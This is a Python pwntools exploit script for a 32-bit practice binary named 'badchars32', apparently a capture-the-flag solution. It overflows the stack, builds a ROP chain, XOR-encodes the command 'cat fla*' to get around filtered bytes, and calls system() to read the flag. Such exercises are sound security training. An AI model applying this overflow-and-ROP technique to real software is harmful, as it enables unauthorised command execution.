from pwn import *


context(arch='i386', os='linux')
binary_name = 'badchars32'
p = process('./'+binary_name)
elf =  ELF(binary_name)


def check_chars(address):
	bad_chars = ["62", "69", "63", "2f", "20", "66", "6e", "73"]
	vals = hex(address).replace("0x","")
	vals2 = [vals[i:i+2] for i in range(0, len(vals), 2)]
	#print hex(address)
	for v in vals2:
		if v in bad_chars:
			print "Problem with %s"%hex(address)


def string_to_hex(string_, byte):
	a = "0x"
	for i in string_[::-1]:
		a += i.encode("hex")
	a = int(a, 16)
	xorer = int( ("0x"+byte*8) , 16)
	xorer = str(hex(a ^ xorer)).replace("0x","")
	xorer = [xorer[i:i+8] for i in range(0, len(xorer), 8)]
	return int(("0x"+xorer[0]),16),int(("0x"+xorer[1]),16)


system = elf.sym["system"] 
pop_esi_edi_ret = 0x08048899 # 0x08048899 : pop esi ; pop edi ; ret
writewhatwhere =  0x08048893 # 0x08048893 : mov dword ptr [edi], esi ; ret
# .data: 0x0804a038
# .bss:  0x0804a040
writable_memory = 0x0804a047
exit =            0x080485a8 #  80485a8:	c9                   	leave  
xor_ebx_ecx =     0x08048890 # 0x08048890 : xor byte ptr [ebx], cl ; ret
pop_ebx_ecx =     0x08048896 # 0x08048896 : pop ebx ; pop ecx ; ret
byte_for_xor =    "15"
c1,c2 =           string_to_hex("cat fla*", byte_for_xor)

check_chars(pop_esi_edi_ret)
check_chars(writewhatwhere)
check_chars(writable_memory)
check_chars(exit)
check_chars(xor_ebx_ecx)
check_chars(pop_ebx_ecx)
check_chars(c1)
check_chars(c2)

log.info("System address (.plt): " + hex(system))
log.info(".data section start    " + hex(writable_memory))
log.info("Write-what-where       " + hex(writewhatwhere))
log.info("xor [ebx], cl          " + hex(xor_ebx_ecx))
log.info("pop ebx; pop ecx; ret: " + hex(pop_ebx_ecx))
log.info("pop esi; pop edi; ret: " + hex(pop_esi_edi_ret))
log.info("1st part of command:   " + hex(c1))
log.info("2nd part of command:   " + hex(c2))
log.info("XORed with byte:       0x" + (byte_for_xor))

rop =  "A"*44
rop += p32(pop_esi_edi_ret) + p32(writable_memory)   + p32(c1)
rop += p32(writewhatwhere)
rop += p32(pop_esi_edi_ret) + p32(writable_memory+4) + p32(c2)
rop += p32(writewhatwhere)

for i in range(0,8):
	rop += p32(pop_ebx_ecx) + p32(int(("0x"+byte_for_xor),16)) + p32(writable_memory+i)
	rop += p32(xor_ebx_ecx)

rop += p32(system) + p32(exit) + p32(writable_memory)

p.recvuntil("> ")
p.send(rop)
p.interactive()